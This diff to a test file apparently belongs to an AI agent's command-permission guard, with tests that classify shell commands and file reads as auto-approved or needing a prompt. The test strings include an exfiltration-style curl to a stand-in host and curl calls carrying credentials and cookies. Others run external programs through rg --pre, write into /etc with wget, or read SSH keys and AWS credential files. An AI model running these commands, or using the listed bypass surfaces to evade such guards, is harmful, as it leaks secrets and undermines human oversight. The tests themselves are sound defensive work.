@@ -181,7 +181,7 @@ describe('classifyShellCommand — curl/wget 带查询串的 GET(exfil 面)', ()
     }
   });
   it('bare / path-only GET 仍放行(命令行浏览器)', () => {
-    for (const c of ['curl -sS https://example.com/', 'curl https://example.com/docs/page', 'wget -q https://example.com']) {
+    for (const c of ['curl -sS https://example.com/', 'curl https://example.com/docs/page', 'wget --max-redirect=0 https://example.com']) {
       expect(classifyShellCommand(c, roots)).toBe('auto-approve');
     }
   });
@@ -218,9 +218,59 @@ describe('classifyShellCommand — curl/wget 目标识别(no-URL fail-closed + �
     expect(classifyShellCommand('curl -sS evil.example/p?data=leak', roots)).toBe('prompt');
   });
   it('bare host / path-only 公网(含无 scheme)仍放行', () => {
-    for (const c of ['curl example.com', 'curl https://example.com/docs', 'curl example.com/docs/page', 'wget -q https://example.com']) {
+    for (const c of ['curl example.com', 'curl https://example.com/docs', 'curl example.com/docs/page', 'wget --max-redirect=0 https://example.com']) {
       expect(classifyShellCommand(c, roots)).toBe('auto-approve');
     }
+  });
+});
+
+// 第三轮护栏:重定向 SSRF、Windows 反斜杠凭证、curl 凭证 flag、rg --pre、wget -P、&> 组合重定向。
+describe('classifyShellCommand — 重定向跟随(SSRF 绕过面)', () => {
+  it('curl -L / 默认跟随的 wget → prompt(最终 host 不可静态判定)', () => {
+    for (const c of ['curl -L https://example.com', 'curl --location https://example.com', 'curl --location-trusted https://x.example', 'wget https://example.com']) {
+      expect(classifyShellCommand(c, roots)).toBe('prompt');
+    }
+  });
+  it('curl 不跟随 / wget 显式关闭跟随 → 公网仍放行', () => {
+    expect(classifyShellCommand('curl https://example.com', roots)).toBe('auto-approve');
+    expect(classifyShellCommand('wget --max-redirect=0 https://example.com', roots)).toBe('auto-approve');
+  });
+});
+
+describe('classifyShellCommand — curl 凭证/隐藏参数 flag / rg --pre / wget -P / &>', () => {
+  it('curl -u/--netrc/-K/-b/鉴权 -H → prompt', () => {
+    for (const c of [
+      'curl -u user:pass https://x.example',
+      'curl --netrc https://x.example',
+      'curl -K curlrc https://x.example',
+      'curl -b cookies.txt https://x.example',
+      'curl -H "Authorization: Bearer abc" https://x.example',
+    ]) {
+      expect(classifyShellCommand(c, roots)).toBe('prompt');
+    }
+  });
+  it('curl 普通 -H(Content-Type/Accept)不误伤', () => {
+    expect(classifyShellCommand('curl -H "Accept: application/json" https://x.example', roots)).toBe('auto-approve');
+  });
+  it('rg --pre 跑外部程序 → prompt;--pre-glob 无害仍放行', () => {
+    expect(classifyShellCommand('rg --pre=/bin/decrypt secret .', roots)).toBe('prompt');
+    expect(classifyShellCommand('rg --pre /bin/x pattern', roots)).toBe('prompt');
+    expect(classifyShellCommand("rg --pre-glob '*.md' TODO", roots)).toBe('auto-approve');
+  });
+  it('wget -P/--directory-prefix 写目录 → prompt', () => {
+    expect(classifyShellCommand('wget -P /etc --max-redirect=0 https://x.example', roots)).toBe('prompt');
+    expect(classifyShellCommand('wget --directory-prefix=/tmp --max-redirect=0 https://x.example', roots)).toBe('prompt');
+  });
+  it('组合重定向 &> / &>> → prompt', () => {
+    expect(classifyShellCommand('echo x &>out.txt', roots)).toBe('prompt');
+    expect(classifyShellCommand('echo x &>>log', roots)).toBe('prompt');
+  });
+});
+
+describe('reviewAction — Windows 反斜杠凭证路径(内置 Read 经此升级)', () => {
+  it('C:\\...\\.ssh\\id_rsa / .aws\\credentials → prompt-each-time', () => {
+    expect(reviewAction({ kind: 'read', path: 'C:\\Users\\me\\.ssh\\id_rsa' }, roots)).toBe('prompt-each-time');
+    expect(reviewAction({ kind: 'read', path: 'C:\\Users\\me\\.aws\\credentials' }, roots)).toBe('prompt-each-time');
   });
 });
 
